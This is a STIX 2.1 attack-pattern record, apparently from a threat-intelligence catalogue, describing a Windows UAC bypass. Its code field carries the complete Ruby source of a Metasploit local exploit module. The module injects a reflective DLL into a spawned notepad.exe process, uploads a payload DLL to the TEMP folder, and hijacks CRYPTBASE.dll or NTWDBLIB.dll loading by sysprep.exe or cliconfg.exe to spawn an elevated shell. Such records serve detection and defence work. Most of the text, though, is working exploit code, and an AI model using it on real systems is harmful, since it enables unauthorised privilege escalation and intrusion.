{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ffdbb0c-36fb-49b0-b262-54feb3f3f6e4",
    "created": "2024-08-14T16:49:41.707117Z",
    "modified": "2024-08-14T16:49:41.707121Z",
    "name": "Windows Escalate UAC Protection Bypass (In Memory Injection)",
    "description": " This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_injection.rb",
            "external_id": "bypassuac_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.trustedsec.com/december-2010/bypass-windows-uac/"
        },
        {
            "source_name": "reference",
            "url": "http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Exploit::FileDropper\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::ReflectiveDLLInjection\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (In Memory Injection)',\n        'Description' => %q{\n          This module will bypass Windows UAC by utilizing the trusted publisher\n          certificate through process injection. It will spawn a second shell that\n          has the UAC flag turned off. This module uses the Reflective DLL Injection\n          technique to drop only the DLL payload binary instead of three separate\n          binaries in the standard technique. However, it requires the correct\n          architecture to be selected, (use x64 for SYSWOW64 systems also).\n          If specifying EXE::Custom your DLL should call ExitProcess() after starting\n          your payload in a separate process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>',\n          'mitnick',\n          'mubix', # Port to local exploit\n          'Ben Campbell', # In memory technique\n          'Lesage', # Win8+ updates\n          'OJ Reeves' # Win 8+ updates\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/'],\n          ['URL', 'http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html']\n        ],\n        'DisclosureDate' => '2010-12-31',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def exploit\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    validate_environment!\n    check_permissions!\n\n    # get all required environment variables in one shot instead. This\n    # is a better approach because we don't constantly make calls through\n    # the session to get the variables.\n    env_vars = get_envs('TEMP', 'WINDIR')\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    dll_path = bypass_dll_path\n    payload_filepath = \"#{env_vars['TEMP']}\\\\#{rand_text_alpha(8)}.dll\"\n\n    upload_payload_dll(payload_filepath)\n\n    pid = spawn_inject_proc(env_vars['WINDIR'])\n\n    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)\n    run_injection(pid, dll_path, file_paths)\n\n    # Windows 7 this is cleared up by DLL but on Windows\n    # 8.1 it fails to delete the file.\n    register_file_for_cleanup(file_paths[:szElevDllFull])\n  end\n\n  def bypass_dll_path\n    # path to the bypassuac binary\n    path = ::File.join(Msf::Config.data_directory, 'post')\n\n    sysarch = sysinfo['Architecture']\n    if sysarch == ARCH_X64\n      unless (target_arch.first =~ /64/i) && (payload_instance.arch.first =~ /64/i)\n        fail_with(Failure::BadConfig, 'x86 Target Selected for x64 System')\n      end\n    elsif (target_arch.first =~ /64/i) || (payload_instance.arch.first =~ /64/i)\n      fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')\n    end\n\n    ::File.join(path, \"bypassuac-#{sysarch}.dll\")\n  end\n\n  def check_permissions!\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\n\n  def run_injection(pid, dll_path, file_paths)\n    vprint_status(\"Injecting #{datastore['DLL_PATH']} into process ID #{pid}\")\n    begin\n      path_struct = create_struct(file_paths)\n\n      vprint_status(\"Opening process #{pid}\")\n      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)\n      exploit_mem, offset = inject_dll_into_process(host_process, dll_path)\n\n      vprint_status(\"Injecting struct into #{pid}\")\n      struct_addr = host_process.memory.allocate(path_struct.length)\n      host_process.memory.write(struct_addr, path_struct)\n\n      vprint_status('Executing payload')\n      thread = host_process.thread.create(exploit_mem + offset, struct_addr)\n      print_good(\"Successfully injected payload in to process: #{pid}\")\n      client.railgun.kernel32.WaitForSingleObject(thread.handle, 14000)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Failed to Inject Payload to #{pid}!\")\n      vprint_error(e.to_s)\n    end\n  end\n\n  # Create a process in the native architecture\n  def spawn_inject_proc(win_dir)\n    print_status('Spawning process with Windows Publisher Certificate, to inject into...')\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      cmd = \"#{win_dir}\\\\sysnative\\\\notepad.exe\"\n    else\n      cmd = \"#{win_dir}\\\\System32\\\\notepad.exe\"\n    end\n    pid = cmd_exec_get_pid(cmd)\n\n    unless pid\n      fail_with(Failure::Unknown, 'Spawning Process failed...')\n    end\n\n    pid\n  end\n\n  def upload_payload_dll(payload_filepath)\n    payload = generate_payload_dll({ dll_exitprocess: true })\n    print_status('Uploading the Payload DLL to the filesystem...')\n    begin\n      vprint_status(\"Payload DLL #{payload.length} bytes long being uploaded..\")\n      write_file(payload_filepath, payload)\n      register_file_for_cleanup(payload_filepath)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Error uploading file #{payload_filepath}: #{e.class} #{e}\")\n    end\n  end\n\n  def validate_environment!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    version_info = get_version_info\n    # According to https://raw.githubusercontent.com/hfiref0x/UACME/c998cb1f1bafd36f566f17208b915dc48dda5edf/README.md\n    if version_info.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win8)\n      print_good(\"#{version_info.product_name} may be vulnerable.\")\n    else\n      fail_with(Failure::NotVulnerable, \"#{version_info.product_name} is not vulnerable.\")\n    end\n\n    if is_uac_enabled?\n      print_status('UAC is Enabled, checking level...')\n    else\n      unless is_in_admin_group?\n        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n      end\n    end\n  end\n\n  def get_file_paths(win_path, payload_filepath)\n    paths = {}\n\n    version_info = get_version_info\n    if version_info.win7_or_2008r2?\n      paths[:szElevDll] = 'CRYPTBASE.dll'\n      paths[:szElevDir] = \"#{win_path}\\\\System32\\\\sysprep\"\n      paths[:szElevDirSysWow64] = \"#{win_path}\\\\sysnative\\\\sysprep\"\n      paths[:szElevExeFull] = \"#{paths[:szElevDir]}\\\\sysprep.exe\"\n    else\n      paths[:szElevDll] = 'NTWDBLIB.dll'\n      paths[:szElevDir] = \"#{win_path}\\\\System32\"\n      # This should be fine to be left blank\n      paths[:szElevDirSysWow64] = ''\n      paths[:szElevExeFull] = \"#{paths[:szElevDir]}\\\\cliconfg.exe\"\n    end\n\n    paths[:szElevDllFull] = \"#{paths[:szElevDir]}\\\\#{paths[:szElevDll]}\"\n    paths[:szTempDllPath] = payload_filepath\n\n    paths\n  end\n\n  # Creates the paths struct which contains all the required paths\n  # the dll needs to copy/execute etc.\n  def create_struct(paths)\n    # write each path to the structure in the order they\n    # are defined in the bypass uac binary.\n    struct = ''\n    struct << fill_struct_path(paths[:szElevDir])\n    struct << fill_struct_path(paths[:szElevDirSysWow64])\n    struct << fill_struct_path(paths[:szElevDll])\n    struct << fill_struct_path(paths[:szElevDllFull])\n    struct << fill_struct_path(paths[:szElevExeFull])\n    struct << fill_struct_path(paths[:szTempDllPath])\n\n    struct\n  end\n\n  def fill_struct_path(path)\n    path = Rex::Text.to_unicode(path)\n    path + \"\\x00\" * (520 - path.length)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-31",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}